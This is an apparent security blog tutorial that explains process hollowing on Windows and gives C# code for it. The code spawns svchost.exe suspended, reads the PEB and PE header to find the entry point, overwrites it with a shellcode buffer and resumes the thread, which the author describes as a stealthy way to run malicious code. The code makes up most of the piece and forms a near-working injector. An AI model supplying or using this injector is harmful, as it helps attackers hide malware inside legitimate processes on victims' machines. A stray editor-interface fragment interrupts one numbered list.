---
title: Process Hollowing in C#
date: 09 Apr 2021
author: Soufiane Fariss
email: soufiane [dot] fariss [at] um5s [dot] net [dot] ma
---
## Process Hollowing: Theory

According to the Oxford dictionary, to *hollow* is to dig up a hole. Hollowing is carving a hole in a structure.

There are many subtechniques to inject into a process memory space (see MITRE ATT@CK Matrix), with newer techniques being discovered every year. Though, techniques like DLL injection will crash a process such `svchost.exe` will crush if try to inject into it, sine it runs on the `SYSTEM` privilege level. A solution to this problem is Process Hollowing.


Process hollowing is a relatively stealthy process injection technique dated almost to ten years ago. It allows for running shellcode in the address space of legitimate process, so it would like the spawned process is doing its legitimate task, but really it is running malicious code. This is done by spawning a process in a `SUSPENDED` state and hollowing the main section with crafted shellcode.



### PE file format
Every operating system has a defined structure for files, on Linux that's the ELF file format and on Windows it is the PE file format. It is vital for any security researcher to really understand this structure since every file (`.exe`, `.dll`, .. etc) follow this format. If this isn't the case, the windows process loader woudln't be able to load it.

We assume that the reader is familiar with this concept, though a quick reminder is presented below.

The structure is fairly large and holds many members but what intrestes is the PE header, since it the one that contains information about how the operating system can map file into memory and associate a virtual address.

An example of this mapping is given in the image below:

![File mapped into memory](https://t1.daumcdn.net/cfile/tistory/2401E242588322871F)

### Process Creation Flow
According to [The Microsoft Press Store by Pearson: Processes, Threads, and Jobs in the Windows Operating System ](https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&seqNum=3) when we call the `CreateProcess()` API the following happens:

![Process Creation FLow with `CreateProcess`](https://ptgmedia.pearsoncmg.com/images/chap5_9780735625303/elementLinks/httpatomoreillycomsourcemspimages892262.jpg)

To resume:
1. Create the virtual address space for the new process
2. Create the stack, _Thread Environment Block_ (TEB) and the _Process Environment Block_ (PEB)
Markdown
Toggle Zen Mode
Preview
Toggle Mode

3.  Load the required DLLs and EXE into memory

**Note**: PEB (TEB) is a structure that containes information about a process (thread)


### Locating the `EntryPoint`
After the program has been loaded into memory, the OS needs to locate the address of the `EntryPoint` to start executing the first instruction. Though, it is a bit tricky to locate this address because of the protection techniques known as ASLR (Address Space Layout Randomization).


To do this, we will use a helper Win32 API `ZwQueryProcessInformation` which retures the address of the PEB of the process in question. From there we can obtain the address of the base image in memory (basically, we will find at which address in memory the mapped program resides). 

This base image address is located at offset `0x10` bytes into the PEB.

![](https://www.red-gate.com/simple-talk/wp-content/uploads/blogbits/simon.cooper/PE%20Headers%20annotated.png)

All PE files must follow this format, which enables us to predict where to read from. First, we read the `e_lfanew` field at offset `0x3C`, which contains the offset from the beginning of the PE (image base) to the PE Header. This offset is given as `0x00 0x00 0x00 0x80` bytes in previous Table. but can vary from file to file. The PE signature found in the PE file format header (above) identifies the beginning of the PE header.

Once we have obtained the offset to the PE header, we can read the `EntryPoint` Relative Virtual Address (RVA) located at offset `0x28` from the PE header. As the name suggests, the RVA is just an offset and needs to be added to the remote process base address to obtain the absolute virtual  memory  address  of  the  `EntryPoint`.  Finally,  we  have  the  desired  start  address  for  our shellcode

## Process Hollowing in C#

We start by importing all api we are going to use from [www.pinvoke.com](www.pinvoke.com)

1. `CreateProcess()` API from `kernel32.dll`
    ```cs
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    static extern bool CreateProcess(
       string lpApplicationName,
       string lpCommandLine,
       ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes,
       bool bInheritHandles,
       uint dwCreationFlags,
       IntPtr lpEnvironment,
       string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);
    ```
    We will set `lpApplicationName` to `null` and `lpCommandLine` to the name of the process we want to inject into, namely `svchost.exe`. Also, `dwCreationFlags` should be set to `0x4` which `CREATE_SUSPENDED` constant.
    
    The `CreateProcess` API uses the `STARTUPINFO` structure to configure how the process should be created and upon execution the API populates the `PROCESS_INFORMATION` structures. So, we need to import both of this structures definitions from P/Invoke.
    
    ```cs
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
         public Int32 cb;
         public string lpReserved;
         public string lpDesktop;
         public string lpTitle;
         public Int32 dwX;
         public Int32 dwY;
         public Int32 dwXSize;
         public Int32 dwYSize;
         public Int32 dwXCountChars;
         public Int32 dwYCountChars;
         public Int32 dwFillAttribute;
         public Int32 dwFlags;
         public Int16 wShowWindow;
         public Int16 cbReserved2;
         public IntPtr lpReserved2;
         public IntPtr hStdInput;
         public IntPtr hStdOutput;
         public IntPtr hStdError;
    }
    ```
    
    The other structure `PROCESS_INFORMATION` is defined as follows:
    ```cs
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
       public IntPtr hProcess;
       public IntPtr hThread;
       public int dwProcessId;
       public int dwThreadId;
    }
    ```
    With API and structures definitions imported, we can spawn `svchost.exe` in a `SUSPENDED` state.
    ```cs
    STARTUPINFO si = new STARTUPINFO();
    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    
    bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
    ```

    We see that process has been spawned in a `SUSPENDED` state indicated by the grey color.
    ![](https://i.imgur.com/XaZaPy0.png)
2. Locating the `EntryPoint` with `ZwQueryProcessInformation()` from `ntdll.dll`
    This helper API call retures information about the process, namely the PEB.
    Again, it's C# signature is
    ```cs
	[DllImport("ntdll.dll", SetLastError=true)]
	private static extern UInt32 ZwQueryInformationProcess(
		IntPtr hProcess,
		int procInformationClass,
		ref PROCESS_BASIC_INFORMATION procInformation,
		UInt32 ProcInfoLen,
		ref UInt32 retlen);
    ```

    When we specify `ProcessBasicInformation`, the third argument (`ProcessInformation`) must be a `PROCESS_BASIC_INFORMATION` structure that is populated by the API.
    The base image address is located at offset `0x10` bytes into the PEB.
    
    ```cs
    [StructLayout(LayoutKind.Sequential)]
	private struct PROCESS_BASIC_INFORMATION
	{
	  public IntPtr ExitStatus;
	  public IntPtr PebBaseAddress;
	  public IntPtr AffinityMask;
	  public IntPtr BasePriority;
	  public IntPtr UniqueProcessId;
	  public IntPtr InheritedFromUniqueProcessId;
	}
	```
	
	We use this to get the process base image address (located at `0x10` offset into the PEB)
	
	```cs
    PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
    uint tmp = 0;
    
    IntPtr hProcess = pi.hProcess;ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
    
    IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
    ```
	
3. Reading from and writing to memory with `ReadProcessMemory()` and `WriteProcessMemory()` from `kernel32.dll`
    ```cs
    [DllImport("kernel32.dll", SetLastError = true)]
	static extern bool ReadProcessMemory(
		IntPtr hProcess,
		IntPtr lpBaseAddress,
		[Out] byte[] lpBuffer,
		int dwSize,
		out IntPtr lpNumberOfBytesRead);
	
	[DllImport("kernel32.dll", SetLastError = true)]
	static extern bool WriteProcessMemory(
		 IntPtr hProcess,
		 IntPtr lpBaseAddress,
		 byte[] lpBuffer,
		 Int32 nSize,
		 out IntPtr lpNumberOfBytesWritten
	);
    ```
    
    Getting the process base image address is as simple as
    
    ```cs
    byte[] addrBuf = new byte[IntPtr.Size];
    IntPtr nRead = IntPtr.Zero;
    ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
    
    IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
	```
	
    We can use this to read the contents (first `0x200` bytes) of the process PE header:
    
    ```cs
    byte[] data = new byte[0x200];
    ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
    ```
    
    We then finally right our shellcode to the entry point
    
    ```cs
    uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
 
    uint opthdr = e_lfanew_offset + 0x28;
 
    uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
 
    IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
 
    byte[] buf = new byte[681] {0xfc,0x48,0x83,0xe4,0xf0,0xe...
    ```

4. Finally, write the shellcode to memory and resume the the thread with `ResumeThread`
    ```cs
    WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
    
    ResumeThread(pi.hThread);
    ```
    **Note**: don't forget to import `ResumeThread` with P/Invoke.



## PoC
See PJ

---
Full source code in `malrepo/process_hollowing.cs`
---
